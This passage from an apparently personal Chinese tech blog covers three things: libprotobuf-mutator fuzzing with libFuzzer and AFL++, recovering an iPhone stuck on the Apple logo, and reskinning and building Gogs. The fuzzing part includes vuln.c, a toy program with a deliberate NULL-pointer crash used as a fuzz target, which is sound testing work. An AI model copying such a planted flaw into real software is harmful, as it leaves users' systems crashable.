href="https://github.com/google/libprotobuf-mutator/blob/master/port/protobuf.h">https://github.com/google/libprotobuf-mutator/blob/master/port/protobuf.h</a>  修改 Makefile 如下</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs makefile">TARGET=lpm_libfuzz<br>CXX=clang++<br>CXXFLAGS=-g -fsanitize=fuzzer,address<br>PB_SRC=test.pb.cc<br><br>PROTOBUF_DIR=<span class="hljs-variable">$(HOME)</span>/code/libprotobuf-mutator/build/external.protobuf/<br>LPM_DIR=<span class="hljs-variable">$(HOME)</span>/code/AFL+/external/libprotobuf-mutator<br>PROTOBUF_LIB=<span class="hljs-variable">$(PROTOBUF_DIR)</span>/lib/libprotobufd.a<br>LPM_LIB=<span class="hljs-variable">$(LPM_DIR)</span>/lib/libprotobuf-mutator-libfuzzer.a <span class="hljs-variable">$(LPM_DIR)</span>/lib/libprotobuf-mutator.a<br>INC=-I<span class="hljs-variable">$(PROTOBUF_DIR)</span>/<span class="hljs-keyword">include</span> -I<span class="hljs-variable">$(HOME)</span>/code/libprotobuf-mutator/ -I<span class="hljs-variable">$(LPM_DIR)</span>/<span class="hljs-keyword">include</span><br>DFUZZ=-DLLVMFuzzerTestOneInput=FuzzTEST<br><br><span class="hljs-section">all: <span class="hljs-variable">$(TARGET)</span></span><br><br><span class="hljs-comment"># for testing libprotobuf + libfuzzer</span><br><span class="hljs-comment"># compile harness first</span><br><span class="hljs-comment"># then link lpm_libfuzz with harness.o &amp; static libraries</span><br><span class="hljs-section">harness.o: harness.cc</span><br><span class="hljs-variable">$(CXX)</span> <span class="hljs-variable">$(CXXFLAGS)</span> -c <span class="hljs-variable">$(DFUZZ)</span> <span class="hljs-variable">$&lt;</span><br><br><span class="hljs-variable">$(TARGET)</span>: harness.o <span class="hljs-variable">$(TARGET)</span>.cc<br><span class="hljs-variable">$(CXX)</span> <span class="hljs-variable">$(CXXFLAGS)</span> -o <span class="hljs-variable">$@</span> <span class="hljs-variable">$^</span> <span class="hljs-variable">$(PB_SRC)</span> <span class="hljs-variable">$(LPM_LIB)</span> <span class="hljs-variable">$(PROTOBUF_LIB)</span> <span class="hljs-variable">$(INC)</span> <span class="hljs-comment"># $(LPM_LIB) must be placed before $(PROTOBUF_LIB)</span><br><br><span class="hljs-meta"><span class="hljs-keyword">.PHONY</span>: clean</span><br><span class="hljs-section">clean: </span><br>rm <span class="hljs-variable">$(TARGET)</span> *.o<br></code></pre></td></tr></table></figure><p>修改 makefile 后，可以正常编译通过。经过我们上面的分析，不需要定义 <code>DFUZZ=-DLLVMFuzzerTestOneInput=FuzzTEST</code> 将这行删除掉，同样可以编译通过。</p><p>执行 <code>lpm_libfuzz</code> 运行正常</p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs dts">➜  ./lpm_libfuzz                                                                                                                                                                                          <br><span class="hljs-symbol">INFO:</span> found LLVMFuzzerCustomMutator (<span class="hljs-number">0x758a80</span>). Disabling -len_control by default.<br><span class="hljs-symbol">INFO:</span> Running with entropic power schedule (<span class="hljs-number">0xFF</span>, <span class="hljs-number">100</span>).                                    <br><span class="hljs-symbol">INFO:</span> Seed: <span class="hljs-number">331712324</span>                       <br><span class="hljs-symbol">INFO:</span> Loaded <span class="hljs-number">1</span> modules   (<span class="hljs-number">434</span> inline <span class="hljs-number">8</span>-bit counters): <span class="hljs-number">434</span> [<span class="hljs-number">0xa056b8</span>, <span class="hljs-number">0xa0586a</span>), <br><span class="hljs-symbol">INFO:</span> Loaded <span class="hljs-number">1</span> PC tables (<span class="hljs-number">434</span> PCs): <span class="hljs-number">434</span> [<span class="hljs-number">0x939398</span>,<span class="hljs-number">0x93aeb8</span>), <br><span class="hljs-symbol">INFO:</span> -max_len is not <span class="hljs-attr">provided</span><span class="hljs-punctuation">;</span> libFuzzer will not generate inputs larger than <span class="hljs-number">4096</span> bytes<br><span class="hljs-symbol">INFO:</span> A corpus is not provided, starting from an empty corpus<br><span class="hljs-meta">#2      INITED cov: 82 ft: 83 corp: 1/1b exec/s: 0 rss: 35Mb</span><br>        NEW_FUNC[<span class="hljs-number">1</span>/<span class="hljs-number">41</span>]: <span class="hljs-number">0x75abb0</span> in TEST::~TEST() <span class="hljs-keyword">/tmp/</span>genfiles/test.pb.cc:<span class="hljs-number">116</span><br>        NEW_FUNC[<span class="hljs-number">2</span>/<span class="hljs-number">41</span>]: <span class="hljs-number">0x75ca10</span> in google::protobuf::UnknownFieldSet* google::protobuf::internal::InternalMetadata::mutable_unknown_fields<span class="hljs-params">&lt;google::protobuf::UnknownFieldSet&gt;</span>() <span class="hljs-keyword">/home/</span>henices<span class="hljs-keyword">/code/</span>libprotobuf-mut<br>ator<span class="hljs-keyword">/build/</span>external.protobuf<span class="hljs-comment">//include/google/protobuf/metadata_lite.h:117</span><br><span class="hljs-meta">#3      NEW    cov: 135 ft: 159 corp: 2/12b lim: 4096 exec/s: 0 rss: 36Mb L: 11/11 MS: 1 CustomCrossOver-</span><br><span class="hljs-meta">#4      NEW    cov: 138 ft: 162 corp: 3/201b lim: 4096 exec/s: 0 rss: 36Mb L: 189/189 MS: 2 InsertRepeatedBytes-Custom-</span><br><span class="hljs-meta">#38     REDUCE cov: 138 ft: 162 corp: 3/127b lim: 4096 exec/s: 0 rss: 37Mb L: 115/115 MS: 5 CustomCrossOver-CustomCrossOver-Custom-InsertRepeatedBytes-Custom-</span><br><span class="hljs-meta">#60     REDUCE cov: 138 ft: 162 corp: 3/124b lim: 4096 exec/s: 0 rss: 37Mb L: 112/112 MS: 4 CustomCrossOver-ShuffleBytes-ChangeByte-Custom-</span><br><span class="hljs-meta">#98     REDUCE cov: 138 ft: 162 corp: 3/56b lim: 4096 exec/s: 0 rss: 37Mb L: 44/44 MS: 5 CrossOver-Custom-Custom-CMP-Custom- DE: <span class="hljs-string">&quot;~\xff\xff\xff\xff\xff\xff\xff&quot;</span>-</span><br><span class="hljs-meta">#144    REDUCE cov: 138 ft: 162 corp: 3/53b lim: 4096 exec/s: 0 rss: 37Mb L: 41/41 MS: 2 CrossOver-Custom-</span><br><span class="hljs-meta">#182    REDUCE cov: 138 ft: 162 corp: 3/25b lim: 4096 exec/s: 0 rss: 37Mb L: 13/13 MS: 5 ChangeBit-Custom-Custom-InsertByte-Custom-</span><br><span class="hljs-meta">#324    REDUCE cov: 138 ft: 162 corp: 3/24b lim: 4096 exec/s: 0 rss: 38Mb L: 12/12 MS: 3 CustomCrossOver-EraseBytes-Custom-</span><br></code></pre></td></tr></table></figure><h3 id="Handling-input-from-AFL-in-our-custom-mutator"><a href="#Handling-input-from-AFL-in-our-custom-mutator" class="headerlink" title="Handling input from AFL++ in our custom mutator"></a>Handling input from AFL++ in our custom mutator</h3><p><a href="https://github.com/bruce30262/libprotobuf-mutator_fuzzing_learning/tree/master/5_libprotobuf_aflpp_custom_mutator_input">https://github.com/bruce30262/libprotobuf-mutator_fuzzing_learning/tree/master/5_libprotobuf_aflpp_custom_mutator_input</a></p><p>主要内容是将 libprotobuf-mutator 和 afl++ 结合起来，使用的 afl++ 的 custom mutator，值得一提的是在这个例子里，需要使用 <code>-fPIC</code> 参数编译 libprotobuf-mutator。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c">cmake .. -GNinja -DCMAKE_C_COMPILER=clang -DLIB_PROTO_MUTATOR_DOWNLOAD_PROTOBUF=ON \<br>-DCMAKE_INSTALL_PREFIX=/home/henices/code/AFL+/external/libprotobuf-mutator \<br>-DCMAKE_CXX_COMPILER=clang++ -DCMAKE_BUILD_TYPE=Debug \<br>-DCMAKE_C_FLAGS=<span class="hljs-string">&quot;-fPIC&quot;</span> -DCMAKE_CXX_FLAGS=<span class="hljs-string">&quot;-fPIC&quot;</span><br></code></pre></td></tr></table></figure><p>主要的步骤在 <a href="https://github.com/bruce30262/libprotobuf-mutator_fuzzing_learning/blob/master/5_libprotobuf_aflpp_custom_mutator_input/README.md">readme.md</a> 中已经介绍得比较清楚了。</p><ul><li><code>lpm_aflpp_custom_mutator_input.cc</code> 是 afl++ 的 custom mutator shared library<ul><li>解析输入数据（testcase buffer）并将其转成 <code>TEST</code> protobuf message</li><li>使用 <code>libprotobuf-mutator</code> 变异 <code>TEST</code> protobuf message</li><li>注册一个 <code>PostProcessor</code> 处理变异后的 <code>TEST</code> protobuf message （非必要步骤）</li></ul></li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">extern</span> <span class="hljs-string">&quot;C&quot;</span> <span class="hljs-function"><span class="hljs-type">size_t</span> <span class="hljs-title">afl_custom_fuzz</span><span class="hljs-params">(MyMutator *mutator, <span class="hljs-comment">// return value from afl_custom_init</span></span></span><br><span class="hljs-params"><span class="hljs-function">                       <span class="hljs-type">uint8_t</span> *buf, <span class="hljs-type">size_t</span> buf_size, <span class="hljs-comment">// input data to be mutated</span></span></span><br><span class="hljs-params"><span class="hljs-function">                       <span class="hljs-type">uint8_t</span> **out_buf, <span class="hljs-comment">// output buffer</span></span></span><br><span class="hljs-params"><span class="hljs-function">                       <span class="hljs-type">uint8_t</span> *add_buf, <span class="hljs-type">size_t</span> add_buf_size,  <span class="hljs-comment">// add_buf can be NULL</span></span></span><br><span class="hljs-params"><span class="hljs-function">                       <span class="hljs-type">size_t</span> max_size)</span> </span>&#123;<br>    <span class="hljs-comment">// This function can be named either &quot;afl_custom_fuzz&quot; or &quot;afl_custom_mutator&quot;</span><br>    <span class="hljs-comment">// A simple test shows that &quot;buf&quot; will be the content of the current test case</span><br>    <span class="hljs-comment">// &quot;add_buf&quot; will be the next test case ( from AFL++&#x27;s input queue )</span><br>    <br>    TEST input;<br>    <span class="hljs-comment">// parse input data to TEST</span><br>    <span class="hljs-comment">// Notice that input data should be a serialized protobuf data</span><br>    <span class="hljs-comment">// Check ./in/ii and test_protobuf_serializer for more detail</span><br>    <span class="hljs-type">bool</span> parse_ok = input.<span class="hljs-built_in">ParseFromArray</span>(buf, buf_size);<br>    <span class="hljs-keyword">if</span>(!parse_ok) &#123;<br>        <span class="hljs-comment">// Invalid serialize protobuf data. Don&#x27;t mutate.</span><br>        <span class="hljs-comment">// Return a dummy buffer. Also mutated_size = 0</span><br>        <span class="hljs-type">static</span> <span class="hljs-type">uint8_t</span> *dummy = <span class="hljs-keyword">new</span> <span class="hljs-type">uint8_t</span>[<span class="hljs-number">10</span>]; <span class="hljs-comment">// dummy buffer with no data</span><br>        *out_buf = dummy;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    &#125;<br>    <span class="hljs-comment">// mutate the protobuf</span><br>    mutator-&gt;<span class="hljs-built_in">Mutate</span>(&amp;input, max_size);<br>    <br>    <span class="hljs-comment">// Convert protobuf to raw data</span><br>    <span class="hljs-type">const</span> TEST *p = &amp;input;<br>    std::string s = <span class="hljs-built_in">ProtoToData</span>(*p);<br>    <span class="hljs-comment">// Copy to a new buffer ( mutated_out )</span><br>    <span class="hljs-type">size_t</span> mutated_size = s.<span class="hljs-built_in">size</span>() &lt;= max_size ? s.<span class="hljs-built_in">size</span>() : max_size; <span class="hljs-comment">// check if raw data&#x27;s size is larger than max_size</span><br>    <span class="hljs-type">uint8_t</span> *mutated_out = <span class="hljs-keyword">new</span> <span class="hljs-type">uint8_t</span>[mutated_size+<span class="hljs-number">1</span>];<br>    <span class="hljs-built_in">memcpy</span>(mutated_out, s.<span class="hljs-built_in">c_str</span>(), mutated_size); <span class="hljs-comment">// copy the mutated data</span><br>    <span class="hljs-comment">// Assign the mutated data and return mutated_size</span><br>    *out_buf = mutated_out;<br>    <span class="hljs-keyword">return</span> mutated_size;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>mutator-&gt;Mutate(&amp;input, max_size);</code> 为真正起作用的核心代码</p><ul><li><code>lpm_aflpp_custom_mutator_input.h</code>  继承了protobuf_mutator::Mutator， 可以使用 libprotobuf-mutator 的 Mutate 方法</li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;libprotobuf-mutator/src/mutator.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;test.pb.h&quot;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;bits/stdc++.h&gt;</span></span><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">MyMutator</span> : <span class="hljs-keyword">public</span> protobuf_mutator::Mutator &#123;<br>&#125;;<br></code></pre></td></tr></table></figure><ul><li><p><code>test_proto_serializer.cc</code></p><ul><li>用于生成一条序列化的 <code>TEST</code> protobuf message，可以作为 fuzz 的初始化 testcase 使用</li></ul></li><li><p><code>vuln.c</code> 漏洞测试程序</p></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;math.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> *argv[])</span><br>&#123;<br>    <span class="hljs-type">char</span> str[<span class="hljs-number">100</span>]=&#123;&#125;;<br>    read(<span class="hljs-number">0</span>, str, <span class="hljs-number">100</span>);<br>    <span class="hljs-type">int</span> *ptr = <span class="hljs-literal">NULL</span>;<br>    <span class="hljs-keyword">if</span>( str[<span class="hljs-number">0</span>] == <span class="hljs-string">&#x27;\x02&#x27;</span> || str[<span class="hljs-number">0</span>] == <span class="hljs-string">&#x27;\xe8&#x27;</span>) &#123;<br>        *ptr = <span class="hljs-number">123</span>; <br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>漏洞测试程序比较简单，只要第一个字节是 <code>0xe8</code> 或者 <code>0x02</code> 即可，libprotobuf-mutator 的变异在这个例子里效率并不高，所以需要使用 <code>PostProcessor</code> 来优化变异。</p><ul><li>Makefile</li></ul><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs makefile">TARGET=lpm_aflpp_custom_mutator_input<br>CXX=clang++-11<br>AFLCC=<span class="hljs-variable">$(HOME)</span>/AFLplusplus/afl-gcc<br>PB_SRC=test.pb.cc<br><br>PROTOBUF_DIR=<span class="hljs-variable">$(HOME)</span>/libprotobuf-mutator/build/external.protobuf<br>PROTOBUF_LIB=<span class="hljs-variable">$(PROTOBUF_DIR)</span>/lib/libprotobufd.a<br><br>LPM_DIR=<span class="hljs-variable">$(HOME)</span>/libprotobuf-mutator<br>LPM_LIB=<span class="hljs-variable">$(LPM_DIR)</span>/build/src/libfuzzer/libprotobuf-mutator-libfuzzer.a <span class="hljs-variable">$(LPM_DIR)</span>/build/src/libprotobuf-mutator.a<br><br>INC=-I<span class="hljs-variable">$(PROTOBUF_DIR)</span>/<span class="hljs-keyword">include</span> -I<span class="hljs-variable">$(LPM_DIR)</span><br><br><span class="hljs-section">all: <span class="hljs-variable">$(TARGET)</span>.so</span><br><br><span class="hljs-variable">$(TARGET)</span>.so: <span class="hljs-variable">$(TARGET)</span>.cc <span class="hljs-variable">$(PB_SRC)</span><br><span class="hljs-variable">$(CXX)</span> -fPIC -c <span class="hljs-variable">$^</span> <span class="hljs-variable">$(INC)</span><br><span class="hljs-variable">$(CXX)</span> -shared -Wall -O3 -o <span class="hljs-variable">$@</span> *.o <span class="hljs-variable">$(LPM_LIB)</span> <span class="hljs-variable">$(PROTOBUF_LIB)</span><br><br><span class="hljs-section">vuln: vuln.c</span><br><span class="hljs-variable">$(AFLCC)</span> -o <span class="hljs-variable">$@</span> <span class="hljs-variable">$^</span><br><br><span class="hljs-section">test_proto_serializer: test_proto_serializer.cc <span class="hljs-variable">$(PB_SRC)</span></span><br><span class="hljs-variable">$(CXX)</span> -o <span class="hljs-variable">$@</span> <span class="hljs-variable">$^</span> <span class="hljs-variable">$(PROTOBUF_LIB)</span> <span class="hljs-variable">$(INC)</span><br><br><span class="hljs-meta"><span class="hljs-keyword">.PHONY</span>: clean</span><br><span class="hljs-section">clean: </span><br>rm *.so *.o vuln test_proto_serializer<br></code></pre></td></tr></table></figure><p>Makefile 有瑕疵，这个章节的内容和 libfuzzer 没有关系，不需要链接 <code>libprotobuf-mutator-libfuzzer.a</code></p><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p><a href="https://developers.google.com/protocol-buffers/docs/cpptutorial">https://developers.google.com/protocol-buffers/docs/cpptutorial</a><br><a href="https://github.com/google/fuzzing/blob/master/docs/structure-aware-fuzzing.md">https://github.com/google/fuzzing/blob/master/docs/structure-aware-fuzzing.md</a><br><a href="https://github.com/google/libprotobuf-mutator/">https://github.com/google/libprotobuf-mutator/</a><br><a href="https://llvm.org/docs/LibFuzzer.html">https://llvm.org/docs/LibFuzzer.html</a><br><a href="https://github.com/bruce30262/libprotobuf-mutator_fuzzing_learning">https://github.com/bruce30262/libprotobuf-mutator_fuzzing_learning</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>Security</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>iPhone 内存满了, 白苹果问题解决方法</title>
    <link href="/cn/iPhone_white_apple/"/>
    <url>/cn/iPhone_white_apple/</url>
    
    <content type="html"><![CDATA[<p>上周媳妇的 iPhone 提示内存满了，重启后就进入白苹果状态。安装 itunes 以更新的方式重刷系统后恢复正常 （如果选择恢复模式则会丢失数据）。<br>刷系统的时候一度遇上 14 错误，重新使用更新系统的方式再刷了一遍后，顺利通过 （运气不错）。顺利登录 iPhone 后马上删除各种 App，清理后台驻留的程序，在此也提示大家 iPhone 手机也是要定期维护啊。</p><p>说起来就上面几句话，实际操作起来比较麻烦，大概弄了一个早上，把几个要点总结一下。</p><h2 id="强制重新启动-iPhone"><a href="#强制重新启动-iPhone" class="headerlink" title="强制重新启动 iPhone"></a>强制重新启动 iPhone</h2><p>其实在刷机前我尝试了强制重启 iPhone，强制重启 iPhone 的方法可以参考下面链接：<br><a href="https://support.apple.com/zh-cn/guide/iphone/iph8903c3ee6/ios">https://support.apple.com/zh-cn/guide/iphone/iph8903c3ee6/ios</a></p><p>新版 iPhone 可以使用下面的方法</p><figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs tap">强制重新启动配备面容 ID 的 iPhone<br><br>若要强制重新启动 iPhone X、iPhone XS、iPhone XR、iPhone 11、iPhone<span class="hljs-number"> 12 </span>或 iPhone 13，请执行以下操作：<br><br>按下并快速松开调高音量按钮，按下并快速松开调低音量按钮，然后按住侧边按钮。当 Apple 标志出现时，松开按钮。<br></code></pre></td></tr></table></figure><p>但是强制重启 iPhone 并没有成功，手机依然处于白苹果状态没有响应。</p><h2 id="进入-DFU-模式"><a href="#进入-DFU-模式" class="headerlink" title="进入 DFU 模式"></a>进入 DFU 模式</h2><p>不进入 DFU 模式无法刷机，iPhone 不同机型进入 DFU 模式的方法不相同，具体的可以参考下面链接：<br><a href="https://support.apple.com/en-us/HT201263">https://support.apple.com/en-us/HT201263</a></p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm">iPhone <span class="hljs-number">8</span> <span class="hljs-keyword">or </span>later: Press <span class="hljs-keyword">and </span>quickly release the Volume Up <span class="hljs-keyword">button. </span><br>Press <span class="hljs-keyword">and </span>quickly release the Volume Down <span class="hljs-keyword">button. </span><br>Then, press <span class="hljs-keyword">and </span>hold the Side <span class="hljs-keyword">button </span>until you see the recovery mode <span class="hljs-keyword">screen.</span><br></code></pre></td></tr></table></figure><h2 id="安装-itunes-刷机"><a href="#安装-itunes-刷机" class="headerlink" title="安装 itunes 刷机"></a>安装 itunes 刷机</h2><p>安装 itunes 的过程就不在细说了，正常安装即可。更新过程需要注意中间某个步骤可能耗时很长，不要着急得慢慢等，Apple 还专门有链接说明这个问题。<br><a href="https://support.apple.com/zh-cn/HT203435">https://support.apple.com/zh-cn/HT203435</a></p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs">出现这种情况后，进度条可能移动非常缓慢或似乎不移动。<br><br>请等待设备完成更新、恢复或抹掉过程。<br><br>进度条会显示安装进度。所用时间取决于设备上的文件数量，以及您是要抹掉、更新还是升级 iOS 或 iPadOS。<br>如果设备上只有很少数据或没有数据，或者如果您要抹掉设备上的数据，这个过程可能只需一分钟时间。<br>如果设备包含大量文件，则这个过程可能需要数分钟至一小时不等。<br></code></pre></td></tr></table></figure><p>刷机过程中大概率会遇上 14 错误，网络上说法很多大概就两点。</p><ul><li>（1）挑线，要保证 USB 数据线有效，优先使用 USB 2.0</li><li>（2）多刷几次，反复刷</li></ul><p>我这次运气不错，遇上 14 错误后，换了个 USB 2.0 的口重刷一次就过了，祝大家好运。</p><p>重启后需要输入密码，提示尝试恢复数据，进度跑完就大功告成了。</p><h2 id="事后的清理工作"><a href="#事后的清理工作" class="headerlink" title="事后的清理工作"></a>事后的清理工作</h2><p>恢复完数据，登录媳妇的手机发现以下几点问题：</p><ul><li>（1） 手机存储空间紧张</li><li>（2） 后台驻留的程序比较多</li></ul><p>导致白苹果的原因未知，将这些问题解决了一下，希望能正常使用了。</p>]]></content>
    
    
    
    <tags>
      
      <tag>Life</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>gogs 皮肤和源码升级</title>
    <link href="/cn/gogs/"/>
    <url>/cn/gogs/</url>
    
    <content type="html"><![CDATA[<p>gogs 使用了也有一年多了，小团队使用基本还行。有几个问题，第一界面代码 merge 有问题，第二不支持代码 review，<br>如果能解决上面两个问题就好用很多了。下面两段是年前折腾 gogs 的记录，没有啥技术含量，只是做个备份。</p><h2 id="切换皮肤"><a href="#切换皮肤" class="headerlink" title="切换皮肤"></a>切换皮肤</h2><p><a href="https://github.com/Kos-M/GogsThemes">https://github.com/Kos-M/GogsThemes</a> 提供了两款皮肤，文中给出的方法要修改 gogs 配置，直接使用 TamperMonkey 就可以了。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-comment">// ==UserScript==</span><br><span class="hljs-comment">// @name         Gogs Theme</span><br><span class="hljs-comment">// @resource     IMPORTED_CSS https://raw.githubusercontent.com/Kos-M/GogsThemes/master/themes/dark_theme.css</span><br><span class="hljs-comment">// @namespace    http://tampermonkey.net/</span><br><span class="hljs-comment">// @version      0.1</span><br><span class="hljs-comment">// @description  try to take over the world!</span><br><span class="hljs-comment">// @author       You</span><br><span class="hljs-comment">// @match        http://website:8000/*</span><br><span class="hljs-comment">// @grant        GM_getResourceText</span><br><span class="hljs-comment">// @grant        GM_addStyle</span><br><span class="hljs-comment">// ==/UserScript==</span><br><br>(<span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-string">&#x27;use strict&#x27;</span>;<br>    <span class="hljs-keyword">const</span> my_css = <span class="hljs-title function_">GM_getResourceText</span>(<span class="hljs-string">&quot;IMPORTED_CSS&quot;</span>);<br>    <span class="hljs-title function_">GM_addStyle</span>(my_css);<br>&#125;)();<br></code></pre></td></tr></table></figure><p>使用后效果图</p><p><img src="https://github.com/henices/pictures/raw/master/gogs0.png"></p><h2 id="源码升级"><a href="#源码升级" class="headerlink" title="源码升级"></a>源码升级</h2><p>gogs 已经有一年多没有提供二进制的安装包了，看了改进不少，就尝试了源码升级。<br>参考 <a href="https://gogs.io/docs/installation/install_from_source#%E6%B5%8B%E8%AF%95%E5%AE%89%E8%A3%85">https://gogs.io/docs/installation/install_from_source#%E6%B5%8B%E8%AF%95%E5%AE%89%E8%A3%85</a></p><h3 id="安装-golang"><a href="#安装-golang" class="headerlink" title="安装 golang"></a>安装 golang</h3><p>参考 Google 官方文档，执行下面命令就可以了。 <a href="https://go.dev/doc/install">https://go.dev/doc/install</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">wget https://go.dev/dl/go1.17.6.linux-amd64.tar.gz<br><span class="hljs-built_in">rm</span> -rf /usr/local/go &amp;&amp; tar -C /usr/local -xzf go1.17.6.linux-amd64.tar.gz<br><span class="hljs-built_in">export</span> PATH=<span class="hljs-variable">$PATH</span>:/usr/local/go/bin<br></code></pre></td></tr></table></figure><h3 id="编译"><a href="#编译" class="headerlink" title="编译"></a>编译</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 克隆仓库到 &quot;gogs&quot; 子目录</span><br>git <span class="hljs-built_in">clone</span> --depth 1 https://github.com/gogs/gogs.git gogs<br><span class="hljs-comment"># 修改工作目录</span><br><span class="hljs-built_in">cd</span> gogs<br><span class="hljs-comment"># 编译主程序，这个步骤会下载所有依赖</span><br>go build -o gogs<br></code></pre></td></tr></table></figure><p>编译过程会下载文件（需要自备梯子），编译完成后将在 gogs 工作目下生成 gogs 可执行文件</p><h3 id="打包"><a href="#打包" class="headerlink" title="打包"></a>打包</h3><p>gogs 源码的 Makefile 提供了打包命令，执行 <code>make pack</code> 即可，将在 release 目生成 